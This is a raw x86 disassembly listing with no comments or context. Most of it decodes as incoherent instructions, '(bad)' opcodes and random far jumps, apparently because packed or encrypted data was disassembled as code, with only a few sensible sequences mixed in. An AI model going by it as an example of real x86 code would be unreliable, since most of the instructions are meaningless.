  40d978:	push   edi
  40d979:	in     eax,0xed
  40d97b:	sbb    dh,al
  40d97d:	push   cs
  40d97e:	scas   eax,DWORD PTR es:[edi]
  40d97f:	popa   
  40d980:	fistp  WORD PTR [ebp-0xe9507d7]
  40d986:	stc    
  40d987:	mov    ah,0xc4
  40d989:	popa   
  40d98a:	mov    eax,0x5912e045
  40d98f:	cli    
  40d990:	fwait
  40d991:	xchg   ebx,eax
  40d992:	mov    gs,WORD PTR [ecx]
  40d994:	retf   
  40d995:	mov    eax,DWORD PTR [ebp-0x24]
  40d998:	test   eax,eax
  40d99a:	mov    eax,DWORD PTR [ebp-0x2c]
  40d99d:	jne    0x40d9a6
  40d9a3:	mov    eax,DWORD PTR [ebp-0x10]
  40d9a6:	xor    eax,esi
  40d9a8:	jmp    0x40deb3
  40d9ad:	rcl    dl,cl
  40d9af:	ds (bad) 
  40d9b1:	ds fcmovnu st,st(1)
  40d9b4:	fnstcw WORD PTR [esi-0x59]
  40d9b7:	sbb    BYTE PTR [edx+0x21],al
  40d9ba:	out    0x63,al
  40d9bc:	cmp    al,0x3e
  40d9be:	mov    eax,0x7c6a7878
  40d9c3:	js     0x40da3d
  40d9c5:	dec    ecx
  40d9c6:	cmp    dl,dl
  40d9c8:	js     0x40d983
  40d9ca:	push   es
  40d9cb:	push   cs
  40d9cc:	jge    0x40d9cb
  40d9ce:	stos   BYTE PTR es:[edi],al
  40d9cf:	lods   eax,DWORD PTR ds:[esi]
  40d9d0:	fwait
  40d9d1:	xor    BYTE PTR [eax+edi*8-0x4e],bh
  40d9d5:	mov    dh,0xad
  40d9d7:	pop    edx
  40d9d8:	std    
  40d9d9:	aas    
  40d9da:	dec    edi
  40d9db:	pushf  
  40d9dc:	loop   0x40d9c3
  40d9de:	fdivrp st(0),st
  40d9e0:	pop    ebp
  40d9e1:	cmp    BYTE PTR [edx+edi*1-0x2],cl
  40d9e5:	retf   0x7c8e
  40d9e8:	js     0x40d9a4
  40d9ea:	mov    bl,0x14
  40d9ec:	dec    edi
  40d9ed:	add    DWORD PTR [edi],ebx
  40d9ef:	icebp  
  40d9f0:	leave  
  40d9f1:	mov    dl,0xf6
  40d9f3:	push   ebx
  40d9f4:	imul   eax,DWORD PTR [esi-0x22],0x6c
  40d9f8:	mov    al,0x81
  40d9fa:	pop    esp
  40d9fb:	xor    eax,0xedbf82e4
  40da00:	adc    cl,BYTE PTR [ecx]
  40da02:	pop    ss
  40da03:	pop    es
  40da04:	idiv   DWORD PTR [ebp-0x40]
  40da07:	mov    BYTE PTR [edx-0x45],al
  40da0a:	jae    0x40d9ba
  40da0c:	int    0x84
  40da0e:	imul   ecx,ecx,0x6c43295e
  40da14:	sub    al,BYTE PTR [edx]
  40da16:	adc    eax,0x5db2e7fb
  40da1b:	cmp    ch,BYTE PTR [edi+0x1e420e3c]
  40da21:	cs mov dh,0x49
  40da24:	mov    bx,0x33cc
  40da28:	aad    0xd8
  40da2a:	dec    esi
  40da2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da2c:	(bad)  
  40da2d:	cmp    DWORD PTR [ecx+0x32],ecx
  40da30:	xor    esp,DWORD PTR [edx-0x7c]
  40da33:	sub    BYTE PTR [ecx+edx*8+0x25],0x30
  40da38:	and    bl,bh
  40da3a:	outs   dx,BYTE PTR ds:[esi]
  40da3b:	pop    esp
  40da3c:	(bad)  
  40da3d:	cmp    DWORD PTR [ecx],ebp
  40da3f:	bound  edi,QWORD PTR [esi+0x72]
  40da42:	imul   esp,DWORD PTR [esi+0x1f],0x8b57bbe5
  40da49:	cmp    edi,DWORD PTR [eax]
  40da4b:	push   ecx
  40da4c:	stos   DWORD PTR es:[edi],eax
  40da4d:	fcom   QWORD PTR [ebp-0x74]
  40da50:	mov    dl,BYTE PTR [edi-0x5e]
  40da53:	retf   0x5aad
  40da56:	mov    dh,0xe3
  40da58:	cdq    
  40da59:	loop   0x40da61
  40da5b:	fstp   TBYTE PTR ds:0x65a8d890
  40da61:	xchg   esp,eax
  40da62:	les    edi,FWORD PTR [ebx+0x61c02c19]
  40da68:	inc    edx
  40da69:	xor    BYTE PTR [ebx+0x46],bh
  40da6c:	cmp    al,0xa0
  40da6e:	js     0x40da71
  40da70:	test   al,0xc0
  40da72:	or     ch,BYTE PTR ds:0x6ad91e41
  40da78:	dec    edx
  40da79:	out    0x5e,eax
  40da7b:	ret    0x590c
  40da7e:	add    al,0x4a
  40da80:	lea    ecx,[edx-0x4b]
  40da83:	rcr    DWORD PTR [eax+eax*8-0x15],0x51
  40da88:	fwait
  40da89:	sbb    cl,bh
  40da8b:	xchg   esp,eax
  40da8c:	dec    ecx
  40da8d:	jmp    DWORD PTR [eax]
  40da8f:	scas   al,BYTE PTR es:[edi]
  40da90:	scas   al,BYTE PTR es:[edi]
  40da91:	in     eax,0xe5
  40da93:	leave  
  40da94:	popa   
  40da95:	jb     0x40da84
  40da97:	(bad)  
  40da98:	retf   
  40da99:	or     BYTE PTR [ecx+edx*2+0x18e438b1],dl
  40daa0:	data16 ja 0x40da64
  40daa3:	scas   al,BYTE PTR es:[edi]
  40daa4:	(bad)  
  40daa5:	push   0xffffffef
  40daa7:	ja     0x40dab9
  40daa9:	mov    bl,0x7d
  40daab:	inc    edx
  40daac:	xchg   BYTE PTR [eax+0x59],bh
  40daaf:	push   eax
  40dab0:	mov    eax,ds:0xde3ae9ad
  40dab5:	(bad)  
  40dab6:	mov    esi,0xa9aa81c5
  40dabb:	mov    al,al
  40dabd:	mov    cs,WORD PTR [ecx+0x2c5a5d2b]
  40dac3:	sub    DWORD PTR [eax+0x11d3b5f9],esi
  40dac9:	aad    0x57
  40dacb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dacc:	icebp  
  40dacd:	mov    esp,0xaee52e2b
  40dad2:	int3   
  40dad3:	dec    ecx
  40dad4:	adc    eax,0x819ddaf1
  40dad9:	mul    BYTE PTR [esi+0x57]
  40dadc:	cmc    
  40dadd:	shl    ebp,0x6d
  40dae0:	pop    edi
  40dae1:	and    eax,0x1b2913cc
  40dae6:	out    0xcf,al
  40dae8:	push   ss
  40dae9:	outs   dx,DWORD PTR ds:[esi]
  40daea:	adc    eax,DWORD PTR ds:0x10783cce
  40daf0:	xor    esp,ebp
  40daf2:	cwde   
  40daf3:	iret   
  40daf4:	jle    0x40daef
  40daf6:	dec    ebp
  40daf7:	and    dh,cl
  40daf9:	or     al,0xf9
  40dafb:	adc    al,0x4b
  40dafd:	xor    al,0xd8
  40daff:	outs   dx,BYTE PTR ds:[esi]
  40db00:	xor    edi,0xffffff86
  40db03:	frstor [ebp-0x351f0edf]
  40db09:	ficomp DWORD PTR [edx-0x226fba]
  40db0f:	add    al,0x36
  40db11:	add    BYTE PTR [edx+ebp*8-0x6c24a03],ah
  40db18:	fs mov esp,0x2a277525
  40db1e:	pusha  
  40db1f:	and    DWORD PTR [edx+0x7b72771f],ecx
  40db25:	mov    ch,0x81
  40db27:	jno    0x40dae1
  40db29:	add    al,0x9d
  40db2b:	inc    esp
  40db2c:	cmp    BYTE PTR [edx-0x2c807b5],cl
  40db32:	fidivr WORD PTR [esi-0x1fbca2ea]
  40db38:	inc    ebp
  40db39:	sub    eax,0xddcda5dc
  40db3e:	inc    ebx
  40db3f:	mov    dh,0x1d
  40db41:	mov    ebp,0xe0638a8f
  40db46:	inc    ecx
  40db47:	inc    sp
  40db49:	lods   eax,DWORD PTR ds:[esi]
  40db4a:	arpl   bx,bx
  40db4c:	sti    
  40db4d:	das    
  40db4e:	mov    al,0x4f
  40db50:	into   
  40db51:	fs jns 0x40daec
  40db54:	xor    edx,DWORD PTR [esp+esi*4+0x37]
  40db58:	adc    ah,BYTE PTR [esi+0x4e]
  40db5b:	dec    ecx
  40db5c:	pop    ss
  40db5d:	daa    
  40db5e:	inc    edi
  40db5f:	sti    
  40db60:	xchg   esi,eax
  40db61:	pop    esi
  40db62:	xor    esi,DWORD PTR [edx-0x346c892c]
  40db68:	retf   
  40db69:	loope  0x40dafb
  40db6b:	aas    
  40db6c:	or     ch,bh
  40db6e:	mov    eax,ds:0xd05c3565
  40db73:	pop    eax
  40db74:	mov    dl,0xd6
  40db76:	ret    0x2d4e
  40db79:	lahf   
  40db7a:	inc    ebp
  40db7b:	(bad)  [esi+0x643d92db]
  40db81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40db82:	pop    eax
  40db83:	repz into 
  40db85:	xchg   ebx,eax
  40db86:	out    dx,al
  40db87:	rol    ecx,0x27
  40db8a:	jo     0x40db31
  40db8c:	lods   eax,DWORD PTR ds:[esi]
  40db8d:	repnz outs dx,DWORD PTR ds:[esi]
  40db8f:	pop    ebx
  40db90:	data16 fucom st(0)
  40db93:	jp     0x40db71
  40db95:	(bad)  [ebp+0x719a20c]
  40db9b:	jle    0x40db9a
  40db9d:	cmp    BYTE PTR [eax+0x79],cl
  40dba0:	dec    ebx
  40dba1:	out    0x67,al
  40dba3:	cmp    eax,0x57025b3b
  40dba8:	jnp    0x40dbd4
  40dbaa:	scas   eax,DWORD PTR es:[edi]
  40dbab:	out    dx,eax
  40dbac:	aas    
  40dbad:	push   edx
  40dbae:	push   0xffffffe8
  40dbb0:	inc    ebp
  40dbb1:	imul   ebp,DWORD PTR [eax],0x5
  40dbb4:	and    eax,0x97d9afbf
  40dbb9:	mov    cl,BYTE PTR [ecx]
  40dbbb:	out    0xa5,al
  40dbbd:	jecxz  0x40dc0f
  40dbbf:	loope  0x40db82
  40dbc1:	pusha  
  40dbc2:	ret    0x9e47
  40dbc5:	inc    ebp
  40dbc6:	(bad)  
  40dbc7:	jmp    0x6dd7:0x8f0a66c5
  40dbce:	js     0x40dbf7
  40dbd0:	push   es
  40dbd1:	dec    ebp
  40dbd2:	pop    eax
  40dbd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dbd4:	popa   
  40dbd5:	iret   
  40dbd6:	sahf   
  40dbd7:	test   eax,0x62881515
  40dbdc:	cmp    BYTE PTR [eax],ah
  40dbde:	jno    0x40dbd8
  40dbe0:	and    DWORD PTR [ebx],edx
  40dbe2:	ss (bad) 
  40dbe4:	mov    bl,0x26
  40dbe6:	clc    
  40dbe7:	fs dec edi
  40dbe9:	div    BYTE PTR [ecx-0x6aa40079]
  40dbef:	pop    es
  40dbf0:	pop    ebp
  40dbf1:	fs hlt 
  40dbf3:	in     al,dx
  40dbf4:	xchg   ecx,eax
  40dbf5:	hlt    
  40dbf6:	call   0x31ba:0xd768e48
  40dbfd:	dec    ebp
  40dbfe:	xchg   ecx,eax
  40dbff:	mov    edx,0xac111e8b
  40dc04:	adc    BYTE PTR [edi+0x5d],bl
  40dc07:	push   esp
  40dc08:	stos   DWORD PTR es:[edi],eax
  40dc09:	pop    ebp
  40dc0a:	cdq    
  40dc0b:	into   
  40dc0c:	jbe    0x40dc1d
  40dc0e:	jo     0x40dc19
  40dc10:	mov    bl,0xe9
  40dc12:	sbb    BYTE PTR [esi+0x49],bh
  40dc15:	inc    ebp
  40dc16:	call   0xd5ac039c
  40dc1b:	mov    dh,0x24
  40dc1d:	clc    
  40dc1e:	jmp    0xa15a:0xfbaa67d9
  40dc25:	sbb    BYTE PTR [esi],cl
  40dc27:	dec    ecx
  40dc28:	outs   dx,DWORD PTR ds:[esi]
  40dc29:	sbb    BYTE PTR [ebx],ch
  40dc2b:	je     0x40dc28
  40dc2d:	pop    edi
  40dc2e:	repz push ebx
  40dc30:	out    dx,eax
  40dc31:	imul   ebp,DWORD PTR [ecx-0x6c3b31e5],0x74
  40dc38:	adc    ebp,DWORD PTR [eax+0x4b]
  40dc3b:	loopne 0x40dc53
  40dc3d:	cdq    
  40dc3e:	(bad)  
  40dc3f:	push   cs
  40dc40:	cdq    
  40dc41:	pop    eax
  40dc42:	mov    dh,0xf9
  40dc44:	lahf   
  40dc45:	stos   DWORD PTR es:[edi],eax
  40dc46:	stc    
  40dc47:	pop    esp
  40dc48:	sub    DWORD PTR [ecx+0x289c6881],ebx
  40dc4e:	add    eax,0xb6f05f0d
  40dc53:	(bad)  
  40dc54:	xlat   BYTE PTR ds:[ebx]
  40dc55:	imul   eax,DWORD PTR [edi+0x50],0x1277034a
  40dc5c:	xchg   edx,eax
  40dc5d:	push   ds
  40dc5e:	jne    0x40dc89
  40dc60:	lahf   
  40dc61:	(bad)
  40dc65:	xor    eax,0x89baecae
  40dc6a:	test   edx,0x2a4c64e7
  40dc70:	jmp    0xd26ac34
  40dc75:	das    
  40dc76:	inc    edx
  40dc77:	cdq    
  40dc78:	(bad)  
  40dc79:	outs   dx,DWORD PTR ds:[esi]
  40dc7a:	mov    esp,edx
  40dc7c:	pop    ebp
  40dc7d:	sub    ch,0xb3
  40dc80:	mov    esi,0xd2c6f8eb
  40dc85:	scas   eax,DWORD PTR es:[edi]
  40dc86:	sub    ebx,edx
  40dc88:	pop    edx
  40dc89:	js     0x40dc20
  40dc8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dc8c:	cmp    DWORD PTR [edx+0x52],esi
  40dc8f:	jle    0x40dc59
  40dc91:	push   ebx
  40dc92:	sub    al,BYTE PTR [edx-0x1b2870cf]
  40dc98:	push   edi
  40dc99:	out    dx,al
  40dc9a:	push   es
  40dc9b:	sub    dl,cl
  40dc9d:	call   0x2d21:0x282153f9
  40dca4:	pop    es
  40dca5:	jns    0x40dc4d
  40dca7:	jmp    0x40dc9a
  40dca9:	cli    
  40dcaa:	mov    dl,0xf8
  40dcac:	es (bad) 
  40dcaf:	push   ebx
  40dcb0:	or     dl,ah
  40dcb2:	xor    al,0x29
  40dcb4:	psrlw  mm3,mm1
  40dcb7:	inc    ecx
  40dcb8:	mov    ch,0xad
  40dcba:	scas   eax,DWORD PTR es:[edi]
  40dcbb:	sub    BYTE PTR [edi],cl
  40dcbd:	jae    0x40dc58
  40dcbf:	adc    esp,0x738eb5e2
  40dcc5:	out    dx,eax
  40dcc6:	dec    DWORD PTR [esi-0x48]
  40dcc9:	or     eax,DWORD PTR [edx+0xc4852f5]
  40dccf:	test   eax,0x792d2dbf
  40dcd4:	pop    edx
  40dcd5:	imul   edi,esi,0x3c54bd97
  40dcdb:	popf   
  40dcdc:	add    DWORD PTR [edx],edi
  40dcde:	and    ah,al
  40dce0:	or     al,0xd8
  40dce2:	xlat   BYTE PTR ds:[ebx]
  40dce3:	jecxz  0x40dd56
  40dce5:	add    DWORD PTR [esi+edx*2-0x5a],eax
  40dce9:	push   ecx
  40dcea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dceb:	mov    ah,0x91
  40dced:	or     eax,esp
  40dcef:	mov    ebp,0xb98f18b4
  40dcf4:	mov    dl,0x24
  40dcf6:	jl     0x40dcf7
  40dcf8:	mov    al,ds:0xc3bb8f88
  40dcfd:	mov    ebx,0x1c6384a5
  40dd02:	cs dec esp
  40dd04:	cs jnp 0x40dc9d
  40dd07:	push   ebp
  40dd08:	retf   
  40dd09:	xor    ebp,DWORD PTR ds:0xedfa8387
  40dd0f:	lds    esp,FWORD PTR [eax-0x7b]
  40dd12:	iret   
  40dd13:	add    eax,0x990f030e
  40dd18:	sub    eax,0xdfa105b7
  40dd1d:	in     eax,0xc1
  40dd1f:	imul   eax,DWORD PTR [edi+0x1f],0xa50740ad
  40dd26:	inc    esp
  40dd27:	test   BYTE PTR [esi-0x11],ah
  40dd2a:	aam    0x14
  40dd2c:	cmp    ebx,edi
  40dd2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dd2f:	mov    al,ds:0x74cb5327
  40dd34:	js     0x40dd25
  40dd36:	fidiv  DWORD PTR [ebx*8+0x2dbbb5e6]
  40dd3d:	and    BYTE PTR [ebp+0x771179f0],0xdf
  40dd44:	js     0x40dd73
  40dd46:	scas   eax,DWORD PTR es:[edi]
  40dd47:	xor    al,0xb8
  40dd49:	mov    DWORD PTR [edx+edx*2+0x7],ebp
  40dd4d:	iret   
  40dd4e:	popa   
  40dd4f:	xchg   edi,eax
  40dd50:	fmul   DWORD PTR [esi-0x7caabfcd]
  40dd56:	fldenv [ecx+0x48427951]
  40dd5c:	pop    esp
  40dd5d:	stc    
  40dd5e:	neg    DWORD PTR [ebx-0x12a600c7]
  40dd64:	fnstcw WORD PTR [edi-0x1c]
  40dd67:	pop    ebx
  40dd68:	sbb    eax,0x97ace436
  40dd6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dd6e:	or     BYTE PTR [ecx-0x40],ah
  40dd71:	outs   dx,BYTE PTR ds:[esi]
  40dd72:	sub    BYTE PTR [edx],0xbe
  40dd75:	inc    esp
  40dd76:	mov    WORD PTR [ebx+0x22],?
  40dd79:	adc    al,0x5b
  40dd7b:	ror    BYTE PTR [esi-0x6ffc78a7],0x74
  40dd82:	dec    ecx
  40dd83:	int3   
  40dd84:	imul   ecx,DWORD PTR [esi],0x7c3934eb
  40dd8a:	jns    0x40ddba
  40dd8c:	inc    edi
  40dd8d:	outs   dx,BYTE PTR ds:[esi]
  40dd8e:	mov    ds:0xa91e5905,eax
  40dd93:	scas   al,BYTE PTR es:[edi]
  40dd94:	or     ebx,ecx
  40dd96:	retf   0x7b6
  40dd99:	popfw  
  40dd9b:	cdq    
  40dd9c:	xor    DWORD PTR [ebx-0x4774c78c],edi
  40dda2:	int3   
  40dda3:	mov    esi,0x79fd117c
  40dda8:	xlat   BYTE PTR ds:[ebx]
  40dda9:	mov    ch,0x59
  40ddab:	inc    edx
  40ddac:	inc    esi
  40ddad:	cmc    
  40ddae:	std    
  40ddaf:	sti    
  40ddb0:	mov    ebx,0x3ed6b24d
  40ddb5:	add    ecx,DWORD PTR [ecx+0x5ceb00e6]
  40ddbb:	fmul   QWORD PTR [ebx-0x2c773641]
  40ddc1:	lods   eax,DWORD PTR ds:[esi]
  40ddc2:	mov    bl,0x42
  40ddc4:	add    dh,BYTE PTR [ebx-0x77]
  40ddc7:	in     eax,dx
  40ddc8:	xadd   BYTE PTR [edx-0xf],cl
  40ddcc:	mov    eax,ds:0x5064213a
  40ddd1:	scas   eax,DWORD PTR es:[edi]
  40ddd2:	pop    es
  40ddd3:	(bad)  
  40ddd4:	sbb    ah,BYTE PTR [edi]
  40ddd6:	dec    ebp
  40ddd8:	dec    edx
  40ddd9:	sub    BYTE PTR [edx],ah
  40dddb:	pop    esi
  40dddc:	cmp    DWORD PTR [eax+0x4d],0xd527f287
  40dde3:	out    dx,al
  40dde4:	fcmovbe st,st(4)
  40dde6:	pop    edi
  40dde7:	rol    dh,0x13
  40ddea:	jno    0x40de39
  40ddec:	xchg   ecx,eax
  40dded:	push   ss
  40ddee:	(bad)  
  40ddef:	std    
  40ddf0:	push   0x53
  40ddf2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ddf3:	dec    ebp
  40ddf4:	js     0x40ddfe
  40ddf6:	pop    ebp
  40ddf7:	stos   BYTE PTR es:[edi],al
  40ddf8:	scas   eax,DWORD PTR es:[edi]
  40ddf9:	jp     0x40dde4
  40ddfb:	pop    edi
  40ddfc:	inc    edx
  40ddfd:	xchg   bh,dl
  40ddff:	inc    edi
  40de00:	mov    ecx,0x528b92d2
  40de05:	js     0x40ddc2
  40de07:	sqrtpd xmm4,XMMWORD PTR [esi-0x12]
  40de0c:	or     eax,0x16ea1061
  40de11:	psrlq  mm5,QWORD PTR [ebp-0x61]
  40de15:	sub    al,0x38
  40de17:	sub    bl,BYTE PTR ds:0xa8781084
  40de1d:	dec    eax
  40de1e:	dec    ebp
  40de1f:	test   BYTE PTR [esi-0x43],0x13
  40de23:	adc    eax,0xb98f0eea
  40de28:	cld    
  40de29:	aaa    
  40de2a:	cmp    al,0x33
  40de2c:	sbb    al,BYTE PTR [ecx]
  40de2e:	loop   0x40de7a
  40de30:	and    eax,DWORD PTR [edx-0x2e]
  40de33:	inc    BYTE PTR [eax+0x0]
  40de36:	ror    ebp,cl
  40de38:	xchg   edi,eax
  40de39:	out    dx,eax
  40de3a:	lods   al,BYTE PTR ds:[esi]
  40de3b:	ror    BYTE PTR [si],cl
  40de3e:	push   ebx
  40de3f:	data16 fidivr DWORD PTR [ebp+0x79]
  40de43:	xchg   DWORD PTR [eax+ecx*1-0x1b22467],esp
  40de4a:	dec    eax
  40de4b:	xchg   edi,eax
  40de4c:	sbb    al,0x4
  40de4e:	js     0x40de72
  40de50:	jne    0x40ddd3
  40de52:	outs   dx,BYTE PTR ds:[esi]
  40de53:	dec    ebx
  40de54:	dec    eax
  40de55:	in     al,dx
  40de56:	les    ebx,FWORD PTR [ebp-0x664d46b0]
  40de5c:	and    DWORD PTR [ebx-0x5f60fb4a],eax
  40de62:	xchg   ebx,eax
  40de63:	cmc    
  40de64:	jg     0x40de25
  40de66:	pusha  
  40de67:	das    
  40de68:	lahf   
  40de69:	sbb    BYTE PTR [esi+ecx*8-0x40],0xf8
  40de6e:	push   edi
  40de6f:	push   0xc968c73e
  40de74:	cmp    ah,cl
  40de76:	mov    DWORD PTR [esi],ecx
  40de78:	mov    bh,0xec
  40de7a:	inc    DWORD PTR ss:[ecx+edx*4]
  40de7e:	scas   eax,DWORD PTR es:[edi]
  40de7f:	mov    dl,0x37
  40de81:	add    eax,0xaeca99a0
  40de86:	sbb    DWORD PTR [edi+0x4a],ebx
  40de89:	cmp    edi,ebx
  40de8b:	addr16 dec esi
  40de8d:	jnp    0x40de44
  40de8f:	xor    edi,DWORD PTR [edi-0x15]
  40de92:	add    ch,ch
  40de94:	mov    edx,0x542bc786
  40de99:	mov    ch,0xd4
  40de9b:	dec    ecx
  40de9c:	jb     0x40de90
  40de9e:	nop
  40de9f:	sbb    edi,DWORD PTR [ebp-0xf]
  40dea2:	mov    dh,0x8b
  40dea4:	mov    esp,0x7cb12e70
  40dea9:	adc    cl,ah
  40deab:	loopne 0x40df20
  40dead:	and    edi,eax
  40deaf:	outs   dx,DWORD PTR ds:[esi]
  40deb0:	clc    
  40deb1:	adc    BYTE PTR [ebx+eax*1],0xc7
  40deb5:	test   eax,eax
  40deb7:	je     0x40fd27
  40debd:	jmp    0x40e3c8
  40dec2:	(bad)  
  40dec3:	ror    dl,cl
  40dec5:	rcr    dl,1
  40dec7:	rcr    dl,1
  40dec9:	rol    BYTE PTR [esi-0x60],cl
  40decc:	enter  0x2b3a,0x31
  40ded0:	xor    al,0x54
  40ded2:	sub    BYTE PTR [ebx+0x78],al
  40ded5:	js     0x40df41
  40ded7:	jl     0x40df51
  40ded9:	js     0x40deeb
  40dedb:	ja     0x40de96
  40dedd:	dec    eax
  40dede:	jmp    0xfba5430f
  40dee3:	dec    eax
  40dee4:	xor    eax,0xd96301b7
  40dee9:	out    0xb0,al
  40deeb:	pop    ss
  40deec:	mov    dl,cl
  40deee:	mov    ebp,0x30894204
  40def3:	dec    ecx
  40def4:	cmp    dl,cl
  40def6:	aam    0xbe
  40def8:	stos   BYTE PTR es:[edi],al
  40def9:	ins    BYTE PTR es:[edi],dx
  40defa:	pop    eax
  40defb:	xchg   esp,eax
  40defc:	xchg   edi,eax
  40defd:	and    eax,0x7efcc96c
  40df02:	pop    esp
  40df03:	xchg   edx,eax
  40df04:	pop    esp
  40df05:	mov    bh,0x23
  40df07:	int3   
  40df08:	jle    0x40df78
  40df0a:	fidiv  DWORD PTR [esp+esi*2]
  40df0d:	adc    bl,ah
  40df0f:	jmp    0x743a:0x40030e4d
  40df16:	jmp    0x68421fc
  40df1b:	xchg   edi,eax
  40df1c:	inc    esp
  40df1d:	imul   esp,DWORD PTR [esi],0x34db6ed6
  40df23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40df24:	pop    ss
  40df25:	push   edi
  40df26:	push   ecx
  40df27:	popf   
  40df28:	sub    eax,0x2a5fe504
  40df2d:	aas    
  40df2e:	inc    eax
  40df2f:	ss add al,0xff
  40df32:	xchg   esp,eax
  40df33:	xor    al,0xe8
  40df35:	and    eax,0xde106ebc
  40df3a:	fadd   DWORD PTR [ebx-0x17]
  40df3d:	adc    eax,0x34858780
  40df42:	add    eax,0x464cd06d
  40df47:	xchg   BYTE PTR [esi+0x2e7ba9cc],bh
  40df4d:	daa    
  40df4e:	add    ebx,DWORD PTR [esi]
  40df50:	add    DWORD PTR [ebx-0x604cea65],eax
  40df56:	sub    dh,BYTE PTR [ecx+ebx*2+0x55]
  40df5a:	sub    al,BYTE PTR [ecx*1+0x2a42bf92]
  40df61:	out    dx,al
  40df62:	adc    al,0xb2
  40df64:	xchg   esi,eax
  40df65:	bound  eax,QWORD PTR [ebx+esi*1-0x3fe736ae]
  40df6c:	es cmp dl,dh
  40df6f:	std    
  40df70:	jno    0x40df48
  40df72:	fistp  QWORD PTR [ebx+ebx*4]
  40df75:	es lock pop esp
  40df78:	es icebp 
  40df7a:	mov    BYTE PTR [ebp-0x238458cb],bh
  40df80:	adc    eax,0x9a29f156
  40df85:	sbb    ah,BYTE PTR [ecx+0x4ecd1070]
  40df8b:	or     esi,DWORD PTR [edx+eiz*4]
  40df8e:	or     ecx,DWORD PTR es:[esi+0x5c5dcb87]
  40df95:	mov    ah,0x7a
  40df97:	sub    eax,0x1bf01d1f
  40df9c:	arpl   bp,sp
  40df9e:	jns    0x40e003
  40dfa0:	lock fcmovu st,st(0)
  40dfa3:	aaa    
  40dfa4:	hlt    
  40dfa5:	daa    
  40dfa6:	ja     0x40dfc8
  40dfa8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dfa9:	sub    ecx,0xffffffd1
  40dfac:	xchg   bl,ch
  40dfae:	in     al,0x9c
  40dfb0:	inc    eax
  40dfb1:	mov    ah,0xcb
  40dfb3:	mov    bl,0x74
  40dfb5:	push   edi
  40dfb6:	dec    esi
  40dfb7:	cli    
  40dfb8:	in     eax,0xd0
  40dfba:	push   0x15fe14e7
  40dfbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dfc0:	sub    esi,ebx
  40dfc2:	in     eax,0x71
  40dfc4:	mov    ah,0xc8
  40dfc6:	in     eax,0xe8
  40dfc8:	sub    al,0xc
  40dfca:	mov    ecx,DWORD PTR [eax+0x19]
  40dfcd:	and    DWORD PTR [ecx+0xf098fcd],esi
  40dfd3:	jnp    0x40dfa4
  40dfd5:	sbb    bl,BYTE PTR gs:[esi+0x7f112534]
  40dfdc:	test   eax,0xe7d8b0bc
  40dfe1:	xchg   edx,eax
  40dfe2:	adc    bl,BYTE PTR [edx+0x62]
  40dfe5:	adc    eax,0x9cd4c63
  40dfea:	sahf   
  40dfeb:	xor    bl,BYTE PTR [edi]
  40dfed:	cmp    edi,esp
  40dfef:	jbe    0x40e068
  40dff1:	mov    edi,0x2e3820f2
  40dff6:	jb     0x40dfee
  40dff8:	jge    0x40dfe7
  40dffa:	jne    0x40e02d
  40dffc:	or     bl,BYTE PTR [edx-0x7]
  40dfff:	in     al,0xdb
  40e001:	nop
  40e002:	lock or dl,0x47
  40e006:	pop    ebp
  40e007:	out    0xd1,al
  40e009:	sbb    eax,0xd8b8b75f
  40e00e:	loopne 0x40e02d
  40e010:	jmp    0x7b760726
  40e015:	sbb    al,0x7a
  40e017:	and    eax,0x12860545
  40e01c:	pop    edx
  40e01d:	adc    DWORD PTR [ebx+0x7a],eax
  40e020:	imul   edi,DWORD PTR [ecx],0x5bd5e394
  40e026:	jle    0x40e053
  40e028:	cli    
  40e029:	fidivr WORD PTR [ebx]
  40e02b:	out    dx,eax
  40e02c:	(bad)  [edx-0x4c]
  40e02f:	jne    0x40e036
  40e031:	fwait
  40e032:	cmp    esi,ecx
  40e034:	rcr    DWORD PTR [eax],0xd0
  40e037:	dec    ecx
  40e038:	xchg   edx,eax
  40e039:	outs   dx,BYTE PTR ds:[esi]
  40e03a:	int3   
  40e03b:	fcomp  QWORD PTR [esp+edi*4]
  40e03e:	adc    dh,BYTE PTR [ebp-0x3fca8873]
  40e044:	add    esi,eax
  40e046:	lea    ebp,[ecx]
  40e048:	mov    ecx,0xdcaca0a1
  40e04d:	iret   
  40e04e:	(bad)
  40e051:	pop    eax
  40e052:	test   BYTE PTR [edx-0x35c0add],0xdc
  40e059:	pop    DWORD PTR [eax]
  40e05b:	adc    BYTE PTR [edi*4-0x7fd045e0],bh
  40e062:	sbb    eax,DWORD PTR [eax]
  40e064:	mov    ds:0x986ec913,al
  40e069:	pushf  
  40e06a:	xor    DWORD PTR ds:0xb9ecd268,eax
  40e070:	and    al,0x80
  40e072:	fisubr DWORD PTR [edi+ecx*1+0x666f906c]
  40e079:	adc    BYTE PTR [eax+edx*2-0x4f],ah
  40e07d:	or     eax,ebp
  40e07f:	cld    
  40e080:	cld    
  40e081:	sahf   
  40e082:	outs   dx,DWORD PTR ds:[esi]
  40e083:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e084:	pop    esi
  40e085:	xchg   DWORD PTR ds:0x8a19f520,eax
  40e08b:	pop    es
  40e08c:	sub    eax,0xd8c0b720
  40e091:	cwde   
  40e092:	add    bh,ah
  40e094:	or     eax,0xd45e72e8
  40e099:	mov    al,0xa2
  40e09b:	shl    BYTE PTR [edx+0x120a61a6],1
  40e0a1:	cdq    
  40e0a2:	and    al,0x4e
  40e0a4:	pop    esi
  40e0a5:	fdivr  DWORD PTR [ecx-0x15]
  40e0a9:	or     BYTE PTR ds:0x64a919f8,dh
  40e0af:	outs   dx,BYTE PTR ds:[esi]
  40e0b0:	mov    DWORD PTR [edi-0x49],ebx
  40e0b3:	mov    ah,0xde
  40e0b5:	mov    ds:0xe7830020,al
  40e0ba:	aam    0x2a
  40e0bc:	cld    
  40e0bd:	jnp    0x40e0e1
  40e0bf:	dec    ecx
  40e0c0:	fwait
  40e0c1:	add    al,0xac
